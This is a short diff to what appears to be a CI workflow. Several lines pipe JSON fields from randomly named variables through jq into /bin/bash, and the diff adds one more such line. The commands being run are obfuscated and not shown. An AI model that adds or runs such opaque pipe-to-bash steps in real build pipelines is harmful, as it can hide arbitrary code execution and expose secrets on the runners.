@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$jyys0" | jq -r .eadd2162 | /bin/bash
           echo $mnaw49435 | jq -r .m4430 | /bin/bash
           echo $cb21 | jq -r .vcquz1918 | /bin/bash
+          echo $l313 | jq -r .yx4 | /bin/bash
 
       - name: Archive output
         if: always()
